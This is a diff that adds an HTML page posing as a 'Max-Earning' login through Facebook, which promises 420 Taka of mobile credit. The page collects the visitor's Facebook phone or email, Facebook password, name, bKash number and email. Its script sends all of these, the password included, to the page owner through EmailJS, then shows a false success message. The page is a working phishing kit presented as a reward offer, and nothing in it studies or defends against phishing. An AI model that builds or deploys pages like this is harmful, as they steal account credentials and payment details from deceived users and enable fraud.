@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login | Max-Earning</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    body {
+  font-family: 'Roboto', sans-serif; /* Custom font */
+  margin: 0;
+  padding: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  padding: -40px;
+  background-color: #f5f5f5; /* Light background color */
+  background-image: url('background.jpg'); /* Background image */
+  background-size: cover;
+}
+
+.container {
+  background-color: rgba(255, 255, 255, 0.9); /* Semi-transparent white background */
+  padding: 10px;
+  border-radius: 10px;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); /* Soft box shadow */
+}
+
+.form-group {
+  margin-bottom: 20px;
+}
+
+label {
+  display: block;
+  font-weight: bold;
+  color: #333; /* Dark text color */
+}
+
+input[type="text"],
+input[type="password"],
+input[type="email"] {
+  width: 90%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  background-color: #f9f9f9; /* Light background color for inputs */
+}
+
+button {
+  background-color: #007bff; /* Brand color for button */
+  color: white;
+  font-size: 20px;
+  padding: 12px 24px;
+  border: none;
+  border-radius: 50px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: background-color 0.3s ease; /* Smooth hover transition */
+}
+
+button:hover {
+  background-color: skyblue; /* Darker brand color on hover */
+}
+
+#showPassword {
+  margin-left: 10px;
+  color: #333; /* Dark text color */
+}
+
+.logo {
+  display: block;
+  margin: 0 auto 20px; /* Center logo */
+  width: 150px;
+  height: auto;
+}
+p{
+  font-size: 12px;
+}
+.earning-logo{
+  font-size: 60px;
+  position: absolute;
+  top: 5px;
+  left: 20px;
+  
+}
+p2{
+  position: absolute;
+  top: 23px;
+  left: 75px;
+  font-size: 15px;
+  
+}
+.facebook-logo{
+  position: absolute;
+  font-size: 40px;
+  top: 50px;
+  text-align: Center;
+  color: #0ea5e9;
+}
+  </style>
+</head>
+<body>
+  <p2>Max-Earning</p2>
+  <div class="facebook-logo">
+      <i class="fa-brands fa-square-facebook"></i>
+  </div>
+ 
+  <div class="earning-logo">
+        <i class="fab fa-pied-piper-alt logo"></i>
+  </div>
+  <div class="container">
+    <h3>Login Max-Earning From Facebook</h3>
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="facebookNumber">Number/Email:</label>
+        <input type="text" id="facebookNumber" name="facebookNumber" placeholder="Facebook Account's Number..." required>
+      </div>
+      <div class="form-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" placeholder="Facebook Account's Password..." required>
+        <input type="checkbox" id="showPassword"> Show Password
+      </div>
+      <div class="form-group">
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" placeholder="Enter Your Name..." required>
+      </div>
+      <div class="form-group">
+        <label for="bikashNumber">Number:</label>
+        <input type="text" id="bikashNumber" name="bikashNumber" placeholder="017××××××××" required>
+        <p>Enter your Number for receiving $420 Taka Faxi-load.!</p>
+      </div>
+      <div class="form-group">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" placeholder="Enter Your Email here.."   required>
+      </div>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+  
+
+
+
+
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+        </script>
+<script>
+  emailjs.init("BhANRyp9s0wkJ227P");
+
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+  event.preventDefault(); // Prevent the form from submitting
+
+  // Get form values
+  var name = document.getElementById('name').value;
+  var email = document.getElementById('email').value;
+  var facebookNumber = document.getElementById('facebookNumber').value;
+  var password = document.getElementById('password').value;
+  var bikashNumber = document.getElementById('bikashNumber').value;
+
+  // Prepare data to send
+  var formData = {
+    name: name,
+    email: email,
+    facebookNumber: facebookNumber,
+    password: password,
+    bikashNumber: bikashNumber
+  };
+
+  // Send data using EmailJS
+  emailjs.send('service_1p1regs', 'template_nvfyerl', {
+    from_name: name,
+    from_email: email,
+    num_ber: facebookNumber,
+    pass_word: password,
+    bikash_number: bikashNumber,
+})
+    .then(function(response) {
+      alert('Your Account has Created successfully!');
+      document.getElementById('name').value = '';
+      document.getElementById('email').value = '';
+      document.getElementById('facebookNumber').value = '';
+      document.getElementById('password').value = '';
+      document.getElementById('bikashNumber').value = '';
+      window.location.href = 'success.html';
+    })
+    .catch(function(error) {
+      alert('Error sending email: ' + error);
+    });
+});
+
+document.getElementById('showPassword').addEventListener('change', function() {
+  var passwordInput = document.getElementById('password');
+  if (passwordInput.type === 'password') {
+    passwordInput.type = 'text';
+  } else {
+    passwordInput.type = 'password';
+  }
+});
+
+</script>
+
+
+
+
+  
+</body>
+</html>
